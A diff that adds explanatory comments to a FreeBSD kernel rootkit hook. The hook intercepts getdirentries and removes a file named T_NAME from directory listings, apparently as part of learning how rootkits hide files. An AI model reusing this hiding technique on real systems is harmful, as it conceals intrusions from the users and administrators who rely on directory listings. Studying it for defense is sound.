@@ -89,17 +89,17 @@ static int getdirentries_hook (struct thread *td, void *syscall_args)
 	unsigned int size, count;
 
 	/* Store the directory entries found in fd in buf, and record the number
-	 * of bytes actually transferred */
-	/* 1 */
+	 * of bytes actually transferred. We have to use the real sys_getdirentries
+	 * to achieve this.*/
 	sys_getdirentries(td, syscall_args);
 	size = td->td_retval[0];
 
 	/* Does fd actually contain any directory entries */
-	/* 2 */
+	/* If fd doesn't contain any entries, then the return value is -1 */
 	if (size > 0)
 	{
 		dp = (struct dirent *) malloc( size, M_TEMP, M_NOWAIT);
-		/* 3 */
+		/* The contents of buf are dirent structures */
 		copyin(uap->buf, dp, size);
 
 		current = dp;
@@ -113,13 +113,13 @@ static int getdirentries_hook (struct thread *td, void *syscall_args)
 			count -= current->d_reclen;
 
 			/* Do we want to hide this file? */
-			/* 4 */
+			/* current->d_name is the filename of each entry */
 			if (strcmp((char *)&(current->d_name), T_NAME) == 0)
 			{
 				/* Copy every directory found after T_NAME over
 				 * T_NAME, effectively cutting it out */
 				if (count != 0)
-					/* 5 */
+					/* Copy the remainder of the dirent structures to buf */
 					bcopy((char *)current +
 							current->d_reclen, current,
 							count);
@@ -137,9 +137,9 @@ static int getdirentries_hook (struct thread *td, void *syscall_args)
 
 		/* If T_NAME was found in fd, adjust the "return values" to hide it.
 		 * If T_NAME wasn't found...don't worry about it. */
-		/* 6 */
+		/* Adjust the return value (number of bytes transferred) */
 		td->td_retval[0] = size;
-		/* 7 */
+		/* Copy the buffer back out to userspace */
 		copyout(dp, uap->buf, size);
 
 		free(dp, M_TEMP);
